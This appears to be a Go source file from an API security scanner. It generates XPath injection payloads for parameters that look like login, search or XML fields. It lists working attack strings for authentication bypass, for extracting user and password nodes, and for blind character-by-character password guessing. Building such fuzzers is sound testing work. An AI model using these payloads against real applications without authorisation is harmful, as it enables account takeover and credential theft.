package payloads

import (
	"strings"

	"github.com/su1ph3r/indago/pkg/types"
)

// XPathGenerator generates XPath injection attack payloads
type XPathGenerator struct{}

// NewXPathGenerator creates a new XPath injection payload generator
func NewXPathGenerator() *XPathGenerator {
	return &XPathGenerator{}
}

// Type returns the attack type
func (g *XPathGenerator) Type() string {
	return types.AttackXPath
}

// Generate generates XPath injection payloads for a parameter
func (g *XPathGenerator) Generate(endpoint types.Endpoint, param *types.Parameter) []Payload {
	var payloads []Payload

	// Target string parameters
	if param.Type != "string" && param.Type != "" {
		return payloads
	}

	// Check if parameter is likely used in XPath operations
	if !g.isXPathRelevant(param, endpoint) {
		return payloads
	}

	// Basic XPath injection payloads
	payloads = append(payloads, g.basicPayloads()...)

	// Authentication bypass payloads
	payloads = append(payloads, g.authBypassPayloads()...)

	// Data extraction payloads
	payloads = append(payloads, g.dataExtractionPayloads()...)

	// Blind XPath injection payloads
	payloads = append(payloads, g.blindPayloads()...)

	return payloads
}

// isXPathRelevant checks if parameter might be used in XPath operations
func (g *XPathGenerator) isXPathRelevant(param *types.Parameter, endpoint types.Endpoint) bool {
	nameLower := strings.ToLower(param.Name)
	pathLower := strings.ToLower(endpoint.Path)

	// XPath-related parameter names
	xpathPatterns := []string{
		"xpath", "path", "node", "xml", "query", "search",
		"user", "username", "login", "name", "id",
		"password", "pass", "pwd",
		"filter", "select", "element", "attribute",
	}

	for _, pattern := range xpathPatterns {
		if strings.Contains(nameLower, pattern) {
			return true
		}
	}

	// XPath-related endpoints
	xpathEndpoints := []string{
		"/xml", "/xpath", "/search", "/query",
		"/auth", "/login", "/authenticate",
		"/config", "/data", "/document",
	}

	for _, ep := range xpathEndpoints {
		if strings.Contains(pathLower, ep) {
			return true
		}
	}

	return false
}

// basicPayloads generates basic XPath injection payloads
func (g *XPathGenerator) basicPayloads() []Payload {
	return []Payload{
		{
			Value:       "'",
			Type:        types.AttackXPath,
			Category:    "injection",
			Description: "XPath single quote error",
		},
		{
			Value:       "\"",
			Type:        types.AttackXPath,
			Category:    "injection",
			Description: "XPath double quote error",
		},
		{
			Value:       "' or '1'='1",
			Type:        types.AttackXPath,
			Category:    "injection",
			Description: "XPath OR true (single quote)",
		},
		{
			Value:       "\" or \"1\"=\"1",
			Type:        types.AttackXPath,
			Category:    "injection",
			Description: "XPath OR true (double quote)",
		},
		{
			Value:       "' or ''='",
			Type:        types.AttackXPath,
			Category:    "injection",
			Description: "XPath empty string comparison",
		},
		{
			Value:       "1' or '1'='1' or '1'='1",
			Type:        types.AttackXPath,
			Category:    "injection",
			Description: "XPath double OR injection",
		},
		{
			Value:       "'] | //*[contains(., '",
			Type:        types.AttackXPath,
			Category:    "injection",
			Description: "XPath union injection",
		},
	}
}

// authBypassPayloads generates XPath authentication bypass payloads
func (g *XPathGenerator) authBypassPayloads() []Payload {
	return []Payload{
		{
			Value:       "admin' or '1'='1",
			Type:        types.AttackXPath,
			Category:    "injection",
			Description: "XPath admin auth bypass",
		},
		{
			Value:       "' or 1=1 or ''='",
			Type:        types.AttackXPath,
			Category:    "injection",
			Description: "XPath numeric comparison bypass",
		},
		{
			Value:       "admin']/parent::*/child::*['",
			Type:        types.AttackXPath,
			Category:    "injection",
			Description: "XPath parent traversal",
		},
		{
			Value:       "admin' or name(.)='user' or '",
			Type:        types.AttackXPath,
			Category:    "injection",
			Description: "XPath node name bypass",
		},
		{
			Value:       "' or position()=1 or ''='",
			Type:        types.AttackXPath,
			Category:    "injection",
			Description: "XPath position bypass (first)",
		},
		{
			Value:       "' or last()=position() or ''='",
			Type:        types.AttackXPath,
			Category:    "injection",
			Description: "XPath position bypass (last)",
		},
		{
			Value:       "' or true() or ''='",
			Type:        types.AttackXPath,
			Category:    "injection",
			Description: "XPath true() function bypass",
		},
		{
			Value:       "admin']//*['",
			Type:        types.AttackXPath,
			Category:    "injection",
			Description: "XPath wildcard descendant",
		},
	}
}

// dataExtractionPayloads generates XPath data extraction payloads
func (g *XPathGenerator) dataExtractionPayloads() []Payload {
	return []Payload{
		{
			Value:       "'] | //user/* | //*['",
			Type:        types.AttackXPath,
			Category:    "injection",
			Description: "XPath extract all user data",
		},
		{
			Value:       "'] | //password | //*['",
			Type:        types.AttackXPath,
			Category:    "injection",
			Description: "XPath extract passwords",
		},
		{
			Value:       "' or contains(.,'admin') or '",
			Type:        types.AttackXPath,
			Category:    "injection",
			Description: "XPath search for admin data",
		},
		{
			Value:       "'] | //* | //*['",
			Type:        types.AttackXPath,
			Category:    "injection",
			Description: "XPath extract all nodes",
		},
		{
			Value:       "' or string-length(name(..))>0 or '",
			Type:        types.AttackXPath,
			Category:    "injection",
			Description: "XPath parent node detection",
		},
		{
			Value:       "' or count(//*)>0 or '",
			Type:        types.AttackXPath,
			Category:    "injection",
			Description: "XPath count all elements",
		},
		{
			Value:       "' | //user/password | '",
			Type:        types.AttackXPath,
			Category:    "injection",
			Description: "XPath union password extraction",
		},
	}
}

// blindPayloads generates blind XPath injection payloads
func (g *XPathGenerator) blindPayloads() []Payload {
	return []Payload{
		{
			Value:       "' or substring(name(/*),1,1)='a",
			Type:        types.AttackXPath,
			Category:    "injection",
			Description: "Blind XPath: root node starts with 'a'",
		},
		{
			Value:       "' or string-length(//user[1]/password)>5 or ''='",
			Type:        types.AttackXPath,
			Category:    "injection",
			Description: "Blind XPath: password length > 5",
		},
		{
			Value:       "' or substring(//user[1]/password,1,1)='a' or ''='",
			Type:        types.AttackXPath,
			Category:    "injection",
			Description: "Blind XPath: password starts with 'a'",
		},
		{
			Value:       "' or count(//user)>1 or ''='",
			Type:        types.AttackXPath,
			Category:    "injection",
			Description: "Blind XPath: multiple users exist",
		},
		{
			Value:       "' or contains(//user[1]/@role,'admin') or ''='",
			Type:        types.AttackXPath,
			Category:    "injection",
			Description: "Blind XPath: admin role check",
		},
		{
			Value:       "' or boolean(//admin) or ''='",
			Type:        types.AttackXPath,
			Category:    "injection",
			Description: "Blind XPath: admin node exists",
		},
	}
}
